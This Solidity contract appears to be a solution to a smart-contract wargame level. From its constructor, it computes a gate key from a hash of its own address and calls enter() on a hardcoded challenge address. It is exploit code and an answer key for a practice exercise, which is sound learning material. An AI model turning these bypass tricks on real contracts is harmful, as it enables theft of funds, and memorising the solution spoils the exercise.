// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

interface GateKeeper {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract GateKeeperMediator {
    bool private result = false;
    constructor(){
        bytes8 key = bytes8(uint64(bytes8(keccak256(abi.encodePacked(this)))) ^ type(uint64).max);

        address levelContractAddress = 0x2E79379B6BcBC85D0912Cf1B9ccba23FE4571189;
        GateKeeper g = GateKeeper(levelContractAddress);
        result = g.enter(key);
    }

    function getResult() external view returns (bool) {
        return result;
    }
}